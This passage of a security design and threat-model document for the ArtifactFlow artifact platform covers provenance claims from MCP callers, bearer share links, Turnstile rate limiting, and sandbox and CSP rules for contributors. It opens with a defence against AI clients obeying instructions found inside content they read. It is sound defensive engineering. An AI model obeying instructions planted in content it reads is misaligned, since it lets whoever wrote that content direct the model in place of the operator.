operator request, not to instructions found inside content they just read. That discipline lives
in the client/operator workflow; the server prevents read content from becoming authorization.

---

## 12. AI provenance claims and external references

Provenance introduces sensitive metadata and integrity risks, not a new authorization capability.
The attacker may be an MCP caller that falsely names a provider/model, supplies a misleading
external URL, tries to place credentials into a URL, or probes provenance search for pages it
cannot otherwise discover.

| Threat | Control | Residual |
| --- | --- | --- |
| Forged provider/model authorship | MCP declarations are always labelled `self_reported`; unverified client-reported metadata is stored separately; no model is inferred from client name, token, URL host, or model-shaped text. | A self-reported claim can be false. Users must not treat it as provider attestation. |
| Authorization side channel through provider/model search | Provenance is an `EXISTS` filter inside the normal visibility-scoped page query, followed by exact `PageAccess` filtering. Reads use the owning page's authorization. | Authorized readers learn the declared provenance of pages they can already read. |
| Credential or script injection through provenance | Every retained provenance string is bounded, storable text and scanned for the same obvious credential patterns that block artifact writes; URLs additionally require HTTPS, a host, and no authority credentials. ArtifactFlow never fetches them. UI output is escaped and opens with `noopener noreferrer`. | Scanning is best-effort and obfuscation can bypass it. A valid HTTPS destination may still be malicious, expired, or track clicks. Opening it is an explicit user action outside ArtifactFlow's trust boundary. |
| Reference leakage through telemetry/search | URLs and opaque references are excluded from logs, errors, domain events, audit metadata, realtime events, and search vectors. Tests inspect event/audit payloads. | Database administrators and backups can read retained references; they are sensitive data at rest. |
| False confidence from “complete” provenance | Completeness only describes whether active claims identify their producer fields; evidence strength is a separate axis shown beside it. | Users can still misunderstand labels. UI and docs state that declarations are not verification. |
| History loss during version pruning | Ingest rows copy version number/hash and soft-reference the version UID, so ordinary content pruning keeps provenance. Hard page deletion cascades it deliberately. | External references remain until page deletion or a later audited redaction/retention feature; backups retain historical copies. |
| Restore misattributed to restoring actor | Restore records `derived_from_version_uid` and, for matching retained hashes, `content_equivalent_to_version_uid`; each ingest also stores its resolved root `content_origin_version_uid`, so reads resolve the effective content origin in constant database work separately from ingest actor/client. | SHA-256 equivalence proves retained-byte equality, not truth of the original producer claim. |
| Client-session storage amplification, spoofing, or malformed metadata | Nested `clientInfo` values must be strings; initialization rejects malformed values. A token-row lock serializes insertion and keeps only the newest 64 client reports per token; token deletion cascades them. UI/API/docs explicitly identify these values as unverified MCP-reported metadata. | Evicted sessions continue to work but lose reported client-name/version attribution on later writes. A caller may report any syntactically valid identity. |
| Historical-provenance search amplification | The denormalized full-text vector indexes a deterministic, deduplicated maximum of 256 provider/model-label pairs. Exhaustive structured provider/model filters remain relational and authorization-scoped. | Full-text queries may omit labels beyond that bounded representative set; structured provenance filters remain the exhaustive path. |

The retained hash is over ArtifactFlow's exact authoritative bytes. For images that means the
normalized derivative, never the discarded upload container. Neither a matching hash nor
MCP-reported client metadata upgrades a declared claim to attested evidence.

---

## 13. External artifact share capabilities

External sharing is a narrow anonymous bearer-capability surface, not public
publishing. A human page access manager may create either a required-expiry
reusable link or a one-time link. An MCP principal with the separately opt-in
`mcp:share` scope may create the same modes only for an in-scope page it owns
and can still edit while that workspace allows Editors and page owners to
share pages; this grants no list, revoke, or access-management authority. Both
modes expose only the latest current version of one page. They do not grant
workspace, hierarchy, taxonomy, search, source, history, identity, MCP,
realtime, editing, or download authority. The complete design and rejected
alternatives live in `docs/architecture/external-sharing.md`.

The raw 256-bit share secret is carried in the URL fragment, removed from
browser history before exchange, sent only in a same-origin POST body, and
stored only as a domain-separated hash. Browser creation and MCP creation each
return the complete URL once; MCP server instructions and operator
documentation treat that response as secret material that must not be copied
into artifacts, metadata, prompts, traces, or logs.
Bootstrap GETs do not validate or consume a share, so mail scanners and unfurlers cannot spend a
one-time capability. There is deliberately no path/query or non-JavaScript fallback that would put
the reusable secret into reverse-proxy logs, referrers, analytics, or rendered HTML.

Successful exchange creates a separate, server-stored pending capability. An explicit
same-origin, CSRF-protected open POST consumes that pending capability. One-time redemption locks
the page and share, rechecks policy and state, marks the share redeemed, and creates exactly one
window-lived external-view session before commit. The raw share secret, pending credential, and view
credential are different values. None is an authenticated application session, and authenticated
browser state never expands anonymous share authority. Artifact content additionally requires a
per-window proof held in `sessionStorage`, so an independently opened window sharing only the
HttpOnly cookie cannot reuse the winning session. Reloading the redeeming window retains access
without an arbitrary countdown. This is not an anti-copy boundary: an authorized recipient can
deliberately clone or copy client-held state just as they can copy already rendered bytes.

Every viewer load and artifact-preview URL issuance rechecks the global kill switch, view-session
expiry, share mode/state/expiry, page archival/deletion, copied workspace identity, and copied page
access revision. Revocation, workspace movement, and relevant access changes therefore fail closed
without waiting for the viewing-session TTL. New current versions remain visible by design.
Deprecation remains visible with fixed application-owned warning text.

Presentation does not create a new rendering bypass:

- Markdown uses the sanitized renderer with authorization-sensitive wiki links disabled;
- executable HTML stays in the existing opaque, `sandbox="allow-scripts"` artifact-origin iframe
  under the restrictive header CSP;
- normalized images stay in the fixed scriptless artifact-origin viewer with `sandbox=""`;
- an exhaustive registry prevents a future page type from becoming externally shareable without an
  explicit safe presenter.

Share-purpose artifact URLs bind the share and external-view session, contain no raw share secret,
and expire no later than their short preview TTL or the expiring link. The public shell and unavailable response
use no third-party resources and send `no-store`, `no-referrer`, and `noindex` policy. Invalid,
expired, redeemed, revoked, archived, deleted, moved, access-invalidated, missing-session, and
rate-limited cases disclose the same unavailable state without artifact metadata.

Residuals remain explicit: a recipient can copy bytes already rendered or deliberately clone the
window proof, possession of the bearer link is not recipient identity, revocation cannot erase
delivered content, and hostile HTML keeps the navigation/WebRTC residuals documented in §2. The
fixed safety interstitial warns recipients not to enter confidential data; acknowledgement is not
a browser security boundary.

---

## 14. Optional Turnstile and authentication abuse

Password login always has three server-side rate-limit dimensions: email+IP per minute, source IP
per minute, and an IP-independent account bucket per hour. These remain the credential-stuffing
boundary. Password recovery is separately bounded by an email/IP hourly limit. Cloudflare
Turnstile is optional defense in depth for internet-facing deployments, not a replacement for
those controls. With both keys absent, no widget is rendered, no Cloudflare CSP source is allowed,
and no Cloudflare request occurs.

When an operator supplies both keys, only the login, reset-link-request, and new-password GET
responses permit `https://challenges.cloudflare.com` in their script and frame CSP sources. The
external script element carries the response's CSP nonce; the frame is authorized by `frame-src`.
The app sends the returned token and derived client IP to Cloudflare Siteverify before password
hash work, reset-notification dispatch, or reset-token consumption. It requires `success=true`, an
exact configured hostname, and the action bound to that form: `login`,
`password_reset_request`, or `password_reset`. Tokens are bounded to Cloudflare's 2,048-character
limit. Missing, structured, oversized, rejected, replayed, malformed, wrong-action,
wrong-hostname, non-2xx, timeout, and transport-failure cases all fail closed with one generic
error. Failed login challenges consume the email+IP and source-IP budgets but not the
account-global password-guess budget because no credential was tested; password-recovery
challenge failures consume the existing email/IP reset-route budget.

Siteverify failures emit a bounded operator warning containing a stable failure reason, an HTTP
status when relevant, and only syntax-restricted Cloudflare error codes. Tokens, keys, visitor IPs,
configured hostnames, and response hostnames are never logged. Authentication route limits bound
repeated failure logging. In non-production environments a partial key pair or malformed enabled
hostname/timeout configuration returns explicit operator guidance with `503`; production still
rejects those states during boot.

This opt-in creates two explicit residuals:

- **Privacy / third-party processing:** the visitor's browser interacts with Cloudflare and the app
  submits the challenge token plus the visitor IP. Cloudflare documents browser-side signals
  including client IP, TLS fingerprint, User-Agent, site key, and associated origin. The deployment
  operator is responsible for deciding that this data flow is acceptable and for the relevant
  privacy notice or processing agreement.
- **Availability:** Cloudflare or outbound Siteverify failure blocks login and password recovery
  while Turnstile is configured. Removing both keys and redeploying restores the independent
  rate-limit-only path.

Production rejects partial key pairs, Cloudflare's published test credentials, hostname drift from
`APP_URL`, invalid timeouts, and credentials exposed to non-app runtime roles. The secret is never
rendered and must be scoped to app-role replicas only.

---

## 15. Contributor rules (the don'ts that prevent regressions)

1. **Never** add `allow-same-origin` to the artifact iframe (embedded or draft).
2. **Never** weaken the CSP because the JS guard "covers" something. The guard is not a control.
3. **Never** serve artifact bytes from the **main application origin**; always the separate
   artifact origin.
4. **Never** render artifact content as a `blob:`/`data:` URL on the main origin.
5. **Never** rely on the `csp=` iframe attribute or on monkeypatching as a boundary.
6. CSP for served artifacts — saved and pre‑save draft alike — is delivered in the **HTTP
   response header**. ArtifactFlow no longer uses `srcdoc`/`<meta>` CSP anywhere.
7. Keep the signed-URL TTL short and the signing key high-entropy and `APP_KEY`-distinct.
8. Any full-screen affordance maximizes the sandboxed iframe or navigates to the
   header-sandboxed URL on the throwaway origin, nothing else.
9. Never treat System Admin or global tag storage as implicit content/taxonomy visibility; preserve
   the live membership/page-grant checks and exact authorization post-filter.
10. Never reload the authenticated application document to rotate an artifact URL or react to a
    realtime version event. Renewal is iframe-only; version updates are an opt-in navigation notice.
11. Never treat an internal user's UID, name, or email as an authorization secret. Directory
    discoverability is intentional; object-level policy and write-boundary reauthorization remain
    mandatory for every action that consumes an identifier.
12. Never infer an AI model from MCP `clientInfo`, a token owner, URL host, or free-form content.
    Keep observed ingest facts, declared producers, and future attestations separate.
13. Never put external provenance URLs/references into logs, events, audit metadata, search
    vectors, queue payloads, or realtime events.
14. Never place an external-share secret in a path, query, cookie, persisted row, rendered DOM,
    artifact URL, log, event, or audit entry. Return it only in the once-only
    browser or MCP creation response. One-time links are consumed only by the
    explicit, locked open POST.
15. Never reuse the authenticated application session as external-share authority or add an unsafe
    generic presenter for a page type.

### Main-application CSP (resolved)
The **main application origin** now ships a real restrictive CSP: `default-src 'self'`,
`script-src 'self' 'nonce-…'` and `style-src 'self' 'nonce-…'` (per-request nonce, no
`unsafe-inline`), `object-src 'none'`, `base-uri 'none'`, `form-action 'self' <artifact origin>`, `frame-src`
limited to the artifact origin, `frame-ancestors 'none'`, plus `X-Frame-Options: DENY`, HSTS,
and `X-Content-Type-Options: nosniff` (`app/Http/Middleware/AddSecurityHeaders.php`).
When Turnstile is configured, only the GET login, reset-link-request, and new-password responses
additionally allow `https://challenges.cloudflare.com` in `script-src` and `frame-src`; other app
responses retain the normal policy.
So even a future HTML-injection on the main origin (e.g. via the `{!! $renderedMarkdown !!}` sink)
is CSP-contained, not just sandbox-contained. Keep the main-app CSP **authoritative** (overwrite,
don't merge, the security-critical directives) so an upstream weak directive can never win.

---

## 16. One-line mental model

> Untrusted code runs **on a throwaway origin, in a browser-sandboxed box, behind a header CSP
> that travels with it.** The browser enforces the box; the origin makes escaping the box
> pointless. Everything in-page JavaScript does is convenience, never containment.
